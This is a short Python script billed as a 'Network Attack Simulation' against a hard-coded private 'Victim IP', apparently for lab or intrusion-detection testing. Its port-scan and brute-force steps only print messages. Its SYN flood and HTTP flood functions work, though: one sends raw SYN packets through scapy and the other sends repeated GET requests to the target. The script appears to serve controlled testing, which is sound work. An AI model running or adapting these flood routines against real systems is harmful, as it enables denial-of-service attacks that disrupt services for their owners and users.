#!/usr/bin/env python3
from scapy.all import *
import requests
from scapy.all import IP, TCP, send
import random
import time

def port_scan(target_ip):
    """Port scanning simulation"""
    print(f"[+] Starting port scan on {target_ip}")
    # Simulate scanning common ports
    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995]
    for port in common_ports:
        print(f"Scanning port {port}")
        time.sleep(0.1)

def syn_flood(target_ip, target_port=80, count=100):
    """SYN Flood attack simulation"""
    print(f"[+] Starting SYN Flood on {target_ip}:{target_port}")
    for i in range(count):
        sport = random.randint(1024, 65535)
        pkt = IP(dst=target_ip)/TCP(sport=sport, dport=target_port, flags="S")
        send(pkt, verbose=0)
        if i % 10 == 0:
            print(f"Sent {i+1} SYN packets...")
    print(f"[+] SYN Flood completed: {count} packets sent")

def http_flood(target_ip, count=50):
    """HTTP Flood simulation"""
    print(f"[+] Starting HTTP Flood on http://{target_ip}")
    target_url = f"http://{target_ip}"
    for i in range(count):
        try:
            requests.get(target_url, timeout=1)
            if i % 10 == 0:
                print(f"Sent {i+1} HTTP requests...")
        except:
            pass  # Expected if server gets overwhelmed
    print(f"[+] HTTP Flood completed: {count} requests sent")

def brute_force_simulation(target_ip):
    """Brute force simulation (without actual attempts)"""
    print(f"[+] Simulating brute force attack on {target_ip}")
    common_usernames = ['admin', 'root', 'test', 'user']
    for user in common_usernames:
        print(f"Trying username: {user}")
        time.sleep(0.2)
    print("[+] Brute force simulation completed")

if __name__ == "__main__":
    target = "172.20.0.10"  # Victim IP
    
    print("=== Network Attack Simulation ===")
    print("1. Port Scanning")
    port_scan(target)
    
    print("\n2. SYN Flood Attack")
    syn_flood(target, count=50)  # Small count for testing
    
    print("\n3. HTTP Flood Attack")
    http_flood(target, count=30)  # Small count for testing
    
    print("\n4. Brute Force Simulation")
    brute_force_simulation(target)
    
    print("\n=== All attacks completed ===")